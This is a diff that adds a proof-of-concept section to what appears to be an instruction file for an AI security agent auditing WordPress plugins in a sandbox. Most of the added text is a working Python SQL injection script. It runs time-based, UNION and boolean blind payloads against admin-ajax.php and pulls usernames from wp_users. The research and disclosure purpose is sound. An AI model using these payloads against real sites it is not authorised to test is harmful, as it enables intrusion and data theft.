@@ -351,6 +351,201 @@ ORDER BY/LIMIT injection (limited impact): 4.3-6.5 depending on data exposed
 
 ---
 
+## PoC Script Creation (REQUIRED)
+
+**When you find a vulnerability, you MUST create a standalone PoC script.**
+
+### File Location
+Save PoC to: `reports/{plugin_slug}/poc_sqli_{short_id}.py`
+
+Example: `reports/gallery-pro/poc_sqli_abc123.py`
+
+### PoC Template for SQL Injection
+
+```python
+#!/usr/bin/env python3
+"""
+PoC for {Vulnerability Title}
+Plugin: {plugin_slug} v{version}
+Vulnerability: sql_injection (UNION/blind_boolean/blind_time/ORDER BY)
+Auth Required: {auth_level}
+
+Usage:
+    python3 poc_sqli.py --url http://target.com
+    python3 poc_sqli.py --url http://target.com -u subscriber -p subscriber
+"""
+
+import argparse
+import requests
+import sys
+import re
+import time
+
+def login(session, base_url, username, password):
+    """Authenticate to WordPress."""
+    login_url = f"{base_url}/wp-login.php"
+    data = {
+        "log": username,
+        "pwd": password,
+        "wp-submit": "Log In",
+        "redirect_to": f"{base_url}/wp-admin/",
+        "testcookie": "1"
+    }
+    resp = session.post(login_url, data=data, allow_redirects=True)
+    return "dashboard" in resp.text.lower() or resp.status_code == 200
+
+def get_nonce(session, base_url, nonce_action):
+    """Fetch WordPress nonce for AJAX action."""
+    resp = session.get(f"{base_url}/wp-admin/admin-ajax.php?action=get_nonce")
+    match = re.search(r'"nonce":"([a-f0-9]+)"', resp.text)
+    return match.group(1) if match else None
+
+def test_time_based(base_url, session, endpoint, param, delay=5):
+    """Test for time-based blind SQL injection."""
+    payload = f"' AND SLEEP({delay})-- -"
+
+    data = {
+        'action': endpoint,
+        param: payload
+    }
+
+    start = time.time()
+    resp = session.post(f"{base_url}/wp-admin/admin-ajax.php", data=data)
+    elapsed = time.time() - start
+
+    return elapsed >= delay, elapsed
+
+def test_union_based(base_url, session, endpoint, param):
+    """Test for UNION-based SQL injection."""
+    # Determine column count first
+    for cols in range(1, 20):
+        union_payload = "' UNION SELECT " + ",".join(["NULL"] * cols) + "-- -"
+        data = {
+            'action': endpoint,
+            param: union_payload
+        }
+        resp = session.post(f"{base_url}/wp-admin/admin-ajax.php", data=data)
+        if "error" not in resp.text.lower():
+            # Found column count, now extract data
+            extract_payload = "' UNION SELECT " + ",".join(
+                ["user_login" if i == 0 else "NULL" for i in range(cols)]
+            ) + " FROM wp_users-- -"
+            data[param] = extract_payload
+            resp = session.post(f"{base_url}/wp-admin/admin-ajax.php", data=data)
+            if "admin" in resp.text:
+                return True, f"UNION injection with {cols} columns - extracted admin user"
+    return False, "UNION injection failed"
+
+def test_boolean_based(base_url, session, endpoint, param):
+    """Test for boolean-based blind SQL injection."""
+    # True condition
+    true_payload = "' AND 1=1-- -"
+    # False condition
+    false_payload = "' AND 1=2-- -"
+
+    data_true = {'action': endpoint, param: true_payload}
+    data_false = {'action': endpoint, param: false_payload}
+
+    resp_true = session.post(f"{base_url}/wp-admin/admin-ajax.php", data=data_true)
+    resp_false = session.post(f"{base_url}/wp-admin/admin-ajax.php", data=data_false)
+
+    # Different responses indicate boolean-based SQLi
+    if len(resp_true.text) != len(resp_false.text):
+        return True, f"Boolean blind SQLi - response length differs ({len(resp_true.text)} vs {len(resp_false.text)})"
+    return False, "Boolean injection failed"
+
+def exploit(base_url, session=None):
+    """
+    Execute the SQL injection exploit.
+
+    Returns:
+        tuple: (vulnerable: bool, details: str)
+    """
+    s = session or requests.Session()
+
+    # === CONFIGURE THESE FOR THE SPECIFIC VULNERABILITY ===
+    endpoint = "vulnerable_action"  # AJAX action name
+    param = "search"  # Vulnerable parameter
+
+    # Test time-based blind SQLi
+    print("[*] Testing time-based blind SQLi...")
+    vuln, elapsed = test_time_based(base_url, s, endpoint, param)
+    if vuln:
+        return True, f"Time-based blind SQLi confirmed (delay: {elapsed:.2f}s)"
+
+    # Test UNION-based SQLi
+    print("[*] Testing UNION-based SQLi...")
+    vuln, details = test_union_based(base_url, s, endpoint, param)
+    if vuln:
+        return True, details
+
+    # Test boolean-based blind SQLi
+    print("[*] Testing boolean-based blind SQLi...")
+    vuln, details = test_boolean_based(base_url, s, endpoint, param)
+    if vuln:
+        return True, details
+
+    return False, "No SQL injection found"
+
+def main():
+    parser = argparse.ArgumentParser(description="PoC for SQL Injection vulnerability")
+    parser.add_argument("--url", "-t", required=True, help="Target WordPress URL")
+    parser.add_argument("--username", "-u", help="WordPress username (if auth required)")
+    parser.add_argument("--password", "-p", help="WordPress password (if auth required)")
+    args = parser.parse_args()
+
+    base_url = args.url.rstrip("/")
+    session = requests.Session()
+
+    # Login if credentials provided
+    if args.username and args.password:
+        print(f"[*] Logging in as {args.username}...")
+        if not login(session, base_url, args.username, args.password):
+            print("[-] Login failed!")
+            sys.exit(1)
+        print("[+] Login successful!")
+
+    # Execute exploit
+    print(f"[*] Testing {base_url} for SQL injection...")
+    vulnerable, details = exploit(base_url, session)
+
+    if vulnerable:
+        print("[+] VULNERABLE!")
+        print(f"[+] Details: {details}")
+    else:
+        print("[-] Not vulnerable or exploit failed")
+        print(f"[-] Details: {details}")
+
+    return 0 if vulnerable else 1
+
+if __name__ == "__main__":
+    sys.exit(main())
+```
+
+### Required Structure
+Every PoC MUST have:
+1. **Argparse CLI** with `--url`, `-u/--username`, `-p/--password`
+2. **Login function** for authenticated vulnerabilities
+3. **Nonce fetching** if the endpoint requires it
+4. **Clear output** showing VULNERABLE or NOT VULNERABLE
+5. **Docstring** with plugin name, version, vuln type, auth level
+
+### PoC Checklist
+- [ ] Script runs with `python3 poc.py --help`
+- [ ] Script works against sandbox: `python3 poc.py --url http://172.17.0.1:8000`
+- [ ] For auth vulns: `python3 poc.py --url http://172.17.0.1:8000 -u subscriber -p subscriber`
+- [ ] Output clearly shows success/failure
+- [ ] No hardcoded URLs or credentials
+- [ ] Tests multiple SQLi techniques (time, UNION, boolean)
+- [ ] Handles errors gracefully
+
+### After Creating PoC
+1. Test it against the sandbox
+2. Create finding with `wpguard_finding_create()`
+3. Include PoC path in finding's `poc_path` field
+
+---
+
 ## Signal Completion
 
 ```python
